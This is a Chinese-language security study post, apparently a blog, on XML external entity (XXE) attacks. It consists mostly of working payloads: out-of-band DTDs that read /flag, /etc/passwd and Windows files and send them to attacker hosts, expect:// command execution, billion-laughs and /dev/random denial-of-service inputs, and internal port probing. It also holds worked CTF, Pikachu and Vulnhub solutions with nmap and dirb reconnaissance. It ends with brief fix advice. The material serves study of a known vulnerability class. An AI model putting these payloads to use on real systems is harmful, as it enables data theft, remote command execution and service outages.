<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://blog.szfszf.top/xml.dtd&quot;</span>&gt;</span>	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span>	%remote;	%send;]&gt;</span><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xml.dtd:&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;&gt;%start;</span><br></pre></td></tr></table></figure>

<p><strong>引入本地文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [	&lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;	&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;	&lt;!ENTITY % ISOamso &#x27;		&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;		&amp;#x25;eval;		&amp;#x25;send;	&#x27;&gt; 	%remote;]&gt;&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<p><strong>嵌套参数实体</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [	&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  	&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://myip/?%file;&#x27;&gt;&quot;&gt;	%start;	%send;]&gt;&lt;message&gt;10&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<p><strong>三层嵌套参数实体</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [	&lt;!ELEMENT message ANY&gt;	&lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;	&lt;!ENTITY % para &#x27;		&lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;		&amp;#x25;para2;	&#x27;&gt;	%para;]&gt;&lt;message&gt;10&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<p><a href="cnblogs.com/20175211lyz/p/11413335.html">更多绕过姿势</a></p>
<hr>
<h4 id="HTTP-内网主机探测-–-端口扫描"><a href="#HTTP-内网主机探测-–-端口扫描" class="headerlink" title="HTTP 内网主机探测 – 端口扫描"></a>HTTP 内网主机探测 – 端口扫描</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;  &lt;!DOCTYPE data SYSTEM <span class="string">&quot;http://127.0.0.1:8080/&quot;</span> [  ]&gt;&lt;data&gt;<span class="number">4</span>&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p>可结合 burp 爆破模块</p>
<h4 id="RCE-PHP-expect模块开启"><a href="#RCE-PHP-expect模块开启" class="headerlink" title="RCE : PHP expect模块开启"></a>RCE : PHP expect模块开启</h4><p>条件：安装 expect扩展的情况下，在PHP环境当中执行系统命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ELEMENT  ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;error&quot;: &quot;no results for description uid=0(root) gid=0(root) groups=0(root)...</span><br></pre></td></tr></table></figure>

<h4 id="Dos攻击"><a href="#Dos攻击" class="headerlink" title="Dos攻击"></a>Dos攻击</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;     &lt;!DOCTYPE lolz [     &lt;!ENTITY lol &quot;lol&quot;&gt;     &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;     &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;     &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;     &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;     &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;     &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;     &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;     &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;     ]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>

<p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。</p>
<p>UNIX 下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [   &lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<p>如果 XML 解析器尝试使用<code>/dev/random</code>文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p>
<h3 id="3-1-3-Pikachu"><a href="#3-1-3-Pikachu" class="headerlink" title="3.1.3 Pikachu"></a>3.1.3 Pikachu</h3><p><strong>读取文件（敏感）</strong></p>
<p>测试环境：Pikachu</p>
<p><strong>有回显</strong></p>
<p><strong>直接读取本地文件进行测验</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;&lt;!DOCTYPE ANY [	&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///d:/test.txt&quot;</span>&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;&lt;!DOCTYPE ANY [	&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///c:/Windows/system32/drivers/etc/hosts&quot;</span>&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<p><strong>引入外部实体</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;http://xxe/1.dtd&quot;&gt;%file;]&gt;&lt;x&gt;&amp;send;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.dtd:&lt;!ENTITY send SYSTEM &quot;file:///d:/test.txt&quot;&gt; </span><br></pre></td></tr></table></figure>

<p><strong>php伪协议</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/222.txt&quot;&gt; ]&gt;&lt;creds&gt;&amp;test;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<p><strong>利用php扩展 expect 执行系统命令 — RCE</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/xxe&gt;</span><br></pre></td></tr></table></figure>

<p><strong>无回显</strong></p>
<p>Payload1:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://xxe/4.dtd&quot;&gt;%dtd;%send;]&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.dtd:&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxe:2222/?data=%file;&#x27;&gt;&quot;&gt;%payload;</span><br></pre></td></tr></table></figure>

<p>Payload2:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % test SYSTEM &quot;http://xxe/xxe2.dtd&quot;&gt;%test;%int;%send;]&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxe2.dtd:&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///d:/222.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxe:9999/?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>端口监听</strong></p>
<p><img src="https://i.loli.net/2021/10/01/E7ipC4frbYIVXBT.png" alt="image-20210430093026570"></p>
<p>日志的读取/文件的接收代码 或者是 开启端口监听</p>
<p><strong>日志查看</strong></p>
<p>环境：win-2003</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.158.115/xxe/3.dtd&quot;&gt;%dtd;%send;]&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.dtd:&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxe:2222/?data=%file;&#x27;&gt;&quot;&gt;%payload;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/v7K6L4nsfyYhGxm.png" alt="image-20210430094003726"></p>
<h3 id="3-1-4-xxe-lab"><a href="#3-1-4-xxe-lab" class="headerlink" title="3.1.4 xxe-lab"></a>3.1.4 xxe-lab</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/Windows/system32/drivers/etc/hosts&quot;</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/222.txt&quot;&gt; ]&gt;&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<h3 id="3-1-5-xlsx-文件攻击"><a href="#3-1-5-xlsx-文件攻击" class="headerlink" title="3.1.5 xlsx 文件攻击"></a>3.1.5 xlsx 文件攻击</h3><p><a href="https://blog.csdn.net/qq_36093477/article/details/82849631">xlsx 文件上传</a></p>
<h2 id="3-2-绕过方式"><a href="#3-2-绕过方式" class="headerlink" title="3.2 绕过方式"></a>3.2 绕过方式</h2><p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">参考</a></p>
<p><a href="https://xz.aliyun.com/t/4059">https://xz.aliyun.com/t/4059</a></p>
<h2 id="3-3-检测"><a href="#3-3-检测" class="headerlink" title="3.3 检测"></a>3.3 检测</h2><ul>
<li><p>工具</p>
</li>
<li><p>人工</p>
<p>数据格式类型判断</p>
<p>Content-Type值判断 text/xml   application/xml</p>
<p>盲猜：更改Content-Type值尝试</p>
</li>
</ul>
<h2 id="3-4-工具"><a href="#3-4-工具" class="headerlink" title="3.4 工具"></a>3.4 工具</h2><p>XXEinjector(Ruby)</p>
<p><a href="https://blog.csdn.net/lm2017/article/details/88394859">安装</a></p>
<p><a href="https://www.cnblogs.com/bmjoker/p/9614990.html">使用</a></p>
<h2 id="3-5-练题"><a href="#3-5-练题" class="headerlink" title="3.5 练题"></a>3.5 练题</h2><h3 id="3-5-1-CTF-show"><a href="#3-5-1-CTF-show" class="headerlink" title="3.5.1 CTF show"></a>3.5.1 CTF show</h3><p>373</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $ctfshow = $creds-&gt;ctfshow;    echo $ctfshow;&#125;highlight_file(__FILE__);    </span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">user</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">all</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>374</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__); </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag&quot;&gt;&lt;!ENTITY % hack SYSTEM &quot;http://xxe/test.dtd&quot;&gt;%hack;%dtd;%xxe;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test.dtd:&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM &#x27;http://xxe:3333/%file;&#x27;&gt; &quot;&gt;%dtd;%xxe;</span><br></pre></td></tr></table></figure>

<p>引用%hack后调用外部文件，后调用%dtd引入嵌套的payload后引用%xxe接收数据</p>
<p>监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2语法：python -m SimpleHTTPServer python3语法：python -m http.server</span><br></pre></td></tr></table></figure>

<p>375</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0); libxml_disable_entity_loader(false); $xmlfile = file_get_contents(&#x27;php://input&#x27;); if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;, $xmlfile))&#123;   	die(&#x27;error&#x27;); 	&#125; if(isset($xmlfile))&#123;   	$dom = new DOMDocument();   	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 	&#125; highlight_file(__FILE__);   </span><br></pre></td></tr></table></figure>

<p>376</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;, $xmlfile))&#123;    die(&#x27;error&#x27;);&#125;if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__);   </span><br></pre></td></tr></table></figure>

<p>377</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;, $xmlfile))&#123;    die(&#x27;error&#x27;);&#125;if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__);    </span><br></pre></td></tr></table></figure>

<h3 id="3-5-2-修改-Content-Type类型"><a href="#3-5-2-修改-Content-Type类型" class="headerlink" title="3.5.2 修改 Content-Type类型"></a>3.5.2 修改 Content-Type类型</h3><p>一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击。</p>
<p><a href="http://web.jarvisoj.com:9882/">题目链接</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [	&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/MTmdcGnZlHxuNwi.png" alt="image-20210430104340700"></p>
<h3 id="3-5-3-引入本地-dtd-文件"><a href="#3-5-3-引入本地-dtd-文件" class="headerlink" title="3.5.3  引入本地 dtd 文件"></a>3.5.3  引入本地 dtd 文件</h3><p><a href="https://bnv.web.ctfcompetition.com/">题目链接</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">message</span> <span class="meta-keyword">ANY</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234010123502402340<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;&lt;!DOCTYPE message [	&lt;!ENTITY % remote SYSTEM <span class="string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;	&lt;!ENTITY % file SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;	&lt;!ENTITY % ISOamso <span class="string">&#x27;		&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;		&amp;#x25;eval;		&amp;#x25;send;	&#x27;</span>&gt; 	%remote;]&gt;&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<p>Exploiting XXE to retrieve data by repurposing a local DTD[2]</p>
<p>这个 payload 主要是利用 错误信息来打印目标文件的内容，重新定义了 <code>docbookx.dtd</code> （一般有 Gnome 就有它）里面的 <code>ISOamso</code>。我们提交了这个 payload 之后，当导入本地的 DTD 文件时，会优先执行我们定义的 <code>ISOamso</code>，因此可以达成任意文件读取。</p>
<h3 id="3-5-4-Vulnhub"><a href="#3-5-4-Vulnhub" class="headerlink" title="3.5.4 Vulnhub"></a>3.5.4 Vulnhub</h3><p><a href="https://www.vulnhub.com/">Vulnhub</a></p>
<p>确定 IP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali:nmap -sS 192.168.158.0/24nmap -sV -p- 192.168.158.121</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/8g31avFJlDqxnAZ.png" alt="image-20210501191238334"></p>
<p>目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.158.121</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *Allow: /User-Agent: *Disallow: /xxe/*Disallow: /admin.php</span><br></pre></td></tr></table></figure>

<p>XXE</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE ANY [	&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;test;&lt;/name&gt;&lt;password&gt;1&lt;/password&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>admin.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE ANY [	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=admin.php&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;test;&lt;/name&gt;&lt;password&gt;1&lt;/password&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php   session_start();?&gt;&lt;html lang = &quot;en&quot;&gt;      &lt;head&gt;      &lt;title&gt;admin&lt;/title&gt;      &lt;link href = &quot;css/bootstrap.min.css&quot; rel = &quot;stylesheet&quot;&gt;            &lt;style&gt;         body &#123;            padding-top: 40px;            padding-bottom: 40px;            background-color: #ADABAB;         &#125;                  .form-signin &#123;            max-width: 330px;            padding: 15px;            margin: 0 auto;            color: #017572;         &#125;                  .form-signin .form-signin-heading,         .form-signin .checkbox &#123;            margin-bottom: 10px;         &#125;                  .form-signin .checkbox &#123;            font-weight: normal;         &#125;                  .form-signin .form-control &#123;            position: relative;            height: auto;            -webkit-box-sizing: border-box;            -moz-box-sizing: border-box;            box-sizing: border-box;            padding: 10px;            font-size: 16px;         &#125;                  .form-signin .form-control:focus &#123;            z-index: 2;         &#125;                  .form-signin input[type=&quot;email&quot;] &#123;            margin-bottom: -1px;            border-bottom-right-radius: 0;            border-bottom-left-radius: 0;            border-color:#017572;         &#125;                  .form-signin input[type=&quot;password&quot;] &#123;            margin-bottom: 10px;            border-top-left-radius: 0;            border-top-right-radius: 0;            border-color:#017572;         &#125;                  h2&#123;            text-align: center;            color: #017572;         &#125;      &lt;/style&gt;         &lt;/head&gt;	   &lt;body&gt;            &lt;h2&gt;Enter Username and Password&lt;/h2&gt;       &lt;div class = &quot;container form-signin&quot;&gt;                  &lt;?php            $msg = &#x27;&#x27;;            if (isset($_POST[&#x27;login&#x27;]) &amp;&amp; !empty($_POST[&#x27;username&#x27;])                &amp;&amp; !empty($_POST[&#x27;password&#x27;])) &#123;				               if ($_POST[&#x27;username&#x27;] == &#x27;administhebest&#x27; &amp;&amp;                   md5($_POST[&#x27;password&#x27;]) == &#x27;e6e061838856bf47e1de730719fb2609&#x27;) &#123;                  $_SESSION[&#x27;valid&#x27;] = true;                  $_SESSION[&#x27;timeout&#x27;] = time();                  $_SESSION[&#x27;username&#x27;] = &#x27;administhebest&#x27;;                                  echo &quot;You have entered valid use name and password &lt;br /&gt;&quot;;		$flag = &quot;Here is the &lt;a style=&#x27;color:FF0000;&#x27; href=&#x27;/flagmeout.php&#x27;&gt;Flag&lt;/a&gt;&quot;;		echo $flag;               &#125;else &#123;                  $msg = &#x27;Maybe Later&#x27;;               &#125;            &#125;         ?&gt;      &lt;/div&gt; &lt;!-- W00t/W00t --&gt;            &lt;div class = &quot;container&quot;&gt;               &lt;form class = &quot;form-signin&quot; role = &quot;form&quot;             action = &quot;&lt;?php echo htmlspecialchars($_SERVER[&#x27;PHP_SELF&#x27;]);             ?&gt;&quot; method = &quot;post&quot;&gt;            &lt;h4 class = &quot;form-signin-heading&quot;&gt;&lt;?php echo $msg; ?&gt;&lt;/h4&gt;            &lt;input type = &quot;text&quot; class = &quot;form-control&quot;                name = &quot;username&quot;                required autofocus&gt;&lt;/br&gt;            &lt;input type = &quot;password&quot; class = &quot;form-control&quot;               name = &quot;password&quot; required&gt;            &lt;button class = &quot;btn btn-lg btn-primary btn-block&quot; type = &quot;submit&quot;                name = &quot;login&quot;&gt;Login&lt;/button&gt;         &lt;/form&gt;			         Click here to clean &lt;a href = &quot;adminlog.php&quot; tite = &quot;Logout&quot;&gt;Session.               &lt;/div&gt;          &lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="3-6-修复建议"><a href="#3-6-修复建议" class="headerlink" title="3.6 修复建议"></a>3.6 修复建议</h2><p>（1）禁止使用外部实体，例如 <code>libxml_disable_entity_loader(true)</code></p>
<p>（2）过滤用户提交的XML数据，防止出现非法内容，如关键词：&lt;!DOCTYPE和&lt;!ENTITY或者SYSTEM和PUBLIC等</p>
<p>（3）检查所使用的底层XML解析库，默认禁止外部实体的解析</p>
<p>（4）若使用第三方应用代码需要及时升级补丁</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP：libxml_disable_entity_loader(true);JAVA:DocumentBuilderFactorydbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Python：from lxml import etreexmlData= etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/walkwaters/p/12057566.html">nmap</a></p>
<h2 id="3-7-参考"><a href="#3-7-参考" class="headerlink" title="3.7 参考"></a>3.7 参考</h2><p>XXE : <a href="https://xz.aliyun.com/t/3357#toc-17">https://xz.aliyun.com/t/3357#toc-17</a></p>
<p>XXE : <a href="https://mature-sec.com/post/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://mature-sec.com/post/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
<p>PHP-dom : <a href="https://www.runoob.com/php/php-xml-parser-expat.html">https://www.runoob.com/php/php-xml-parser-expat.html</a></p>
<p>菜鸟教程~XML： <a href="https://www.runoob.com/xml/xml-tutorial.html">https://www.runoob.com/xml/xml-tutorial.html</a></p>
<p>菜鸟教程~DTD： <a href="https://www.runoob.com/dtd/dtd-tutorial.html">https://www.runoob.com/dtd/dtd-tutorial.html</a></p>
<p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p>
<p><a href="https://www.runoob.com/schema/schema-tutorial.html">XML Schema 菜鸟教程</a></p>
<p><a href="https://www.freebuf.com/column/156863.html">使用 XML Schema 攻击</a></p>
<p><a href="http://www.anquanke.com/post/id/87481">XSLT 攻击 (xxe)</a></p>
<p><a href="https://www.cnblogs.com/AtesetEnginner/p/11261653.html">https://www.cnblogs.com/AtesetEnginner/p/11261653.html</a></p>
